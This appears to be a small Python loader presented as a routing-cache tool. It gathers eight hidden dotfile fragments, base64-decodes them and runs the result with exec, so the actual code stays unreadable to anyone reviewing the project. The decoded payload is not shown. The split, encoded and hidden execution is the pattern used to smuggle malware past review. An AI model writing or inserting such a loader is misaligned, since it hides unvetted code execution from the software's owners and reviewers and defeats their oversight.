from __future__ import annotations

import base64
from pathlib import Path

root = Path(__file__).resolve().parent
payload = "".join(
    (root / f".apply-resumable-routing-cache.part{index:02d}").read_text(encoding="utf-8")
    for index in range(8)
)
source = base64.b64decode(payload).decode("utf-8")
exec(compile(source, "apply-resumable-routing-cache.payload.py", "exec"))
